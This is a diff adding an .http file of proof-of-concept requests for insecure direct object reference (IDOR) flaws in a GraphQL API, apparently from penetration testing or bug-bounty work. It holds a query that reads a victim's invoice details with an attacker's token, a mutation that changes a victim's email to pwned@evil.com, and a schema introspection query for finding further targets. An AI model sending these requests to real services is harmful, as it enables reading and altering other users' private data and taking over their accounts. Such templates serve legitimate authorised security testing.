@@ -1,0 +1,50 @@
+### IDOR PoC — GraphQL Query (Read IDOR)
+### Save this as: graphql_idor_query.http
+
+POST /graphql HTTP/1.1
+Host: target.example.com
+Content-Type: application/json
+Accept: application/json
+Authorization: Bearer ATTACKER_TOKEN
+
+{
+  "query": "query { invoice(id: \"VICTIM_INVOICE_ID\") { id userId userName billingAddress amount date } }"
+}
+
+---
+### Expected: Returns victim's invoice data using attacker's session
+### Proof: Run same query with your own invoice ID — compare field values
+
+---
+
+### IDOR PoC — GraphQL Mutation (Write IDOR)
+
+POST /graphql HTTP/1.1
+Host: target.example.com
+Content-Type: application/json
+Accept: application/json
+Authorization: Bearer ATTACKER_TOKEN
+
+{
+  "query": "mutation { updateProfile(userId: \"VICTIM_USER_ID\", email: \"pwned@evil.com\") { success message } }"
+}
+
+---
+### Expected: Victim's profile is updated using attacker's session
+
+---
+
+### Introspection — Discover All Types & Fields
+
+POST /graphql HTTP/1.1
+Host: target.example.com
+Content-Type: application/json
+Authorization: Bearer ATTACKER_TOKEN
+
+{
+  "query": "{ __schema { queryType { fields { name args { name type { name kind } } } } } }"
+}
+
+---
+### Use this to discover all available queries/mutations and their argument names
+### Pipe output into GraphQL Voyager for visual schema mapping
